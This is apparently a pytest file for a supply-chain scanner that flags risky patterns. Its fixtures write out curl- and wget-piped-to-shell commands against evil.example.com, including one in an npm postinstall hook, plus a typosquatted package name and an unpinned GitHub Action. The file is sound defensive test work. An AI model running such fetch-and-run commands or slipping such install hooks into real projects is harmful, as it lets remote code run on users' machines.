"""Tests for scripts/scan_supply_chain_iocs.py."""

from __future__ import annotations

import json
from pathlib import Path


SCRIPT = "scan_supply_chain_iocs.py"


def write(path: Path, body: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body, encoding="utf-8")


def test_clean_tree_passes(tmp_path: Path, runner) -> None:
    write(
        tmp_path / "scripts" / "deploy.sh",
        "#!/usr/bin/env bash\nset -euo pipefail\nnpm install\n",
    )
    write(tmp_path / "requirements.txt", "pytest==8.0.0\nrequests==2.31.0\n")
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 0, result.stderr


def test_curl_pipe_bash_is_flagged(tmp_path: Path, runner) -> None:
    write(
        tmp_path / "scripts" / "bad.sh",
        "#!/usr/bin/env bash\ncurl -sSL https://evil.example.com/x | bash\n",
    )
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 1
    assert "curl/wget piped to shell" in result.stderr


def test_wget_pipe_sh_is_flagged(tmp_path: Path, runner) -> None:
    write(
        tmp_path / "scripts" / "bad.sh",
        "#!/usr/bin/env bash\nwget -qO- https://evil.example.com/x | sh\n",
    )
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 1


def test_npm_postinstall_shell_is_flagged(tmp_path: Path, runner) -> None:
    package_json = {
        "name": "evil",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl -sSL https://evil.example.com/run.sh | bash",
        },
    }
    write(tmp_path / "package.json", json.dumps(package_json, indent=2))
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 1
    assert "npm 'postinstall' lifecycle shells out" in result.stderr


def test_git_dependency_url_is_flagged(tmp_path: Path, runner) -> None:
    package_json = {
        "name": "mypkg",
        "version": "1.0.0",
        "dependencies": {
            "thing": "git+https://github.com/random-user/thing.git#abc123",
        },
    }
    write(tmp_path / "package.json", json.dumps(package_json, indent=2))
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 1
    assert "direct git dependency" in result.stderr


def test_floating_github_action_ref_is_flagged(tmp_path: Path, runner) -> None:
    write(
        tmp_path / ".github" / "workflows" / "deploy.yml",
        "name: deploy\non: push\njobs:\n  go:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - uses: third-party/dangerous-action@main\n",
    )
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 1
    assert "moving ref" in result.stderr


def test_typosquat_candidate_in_requirements_is_flagged(
    tmp_path: Path, runner
) -> None:
    write(tmp_path / "requirements.txt", "requestz==1.0.0\npytest==8.0.0\n")
    result = runner(SCRIPT, tmp_path)
    assert result.returncode == 1
    assert "typosquat" in result.stderr.lower()
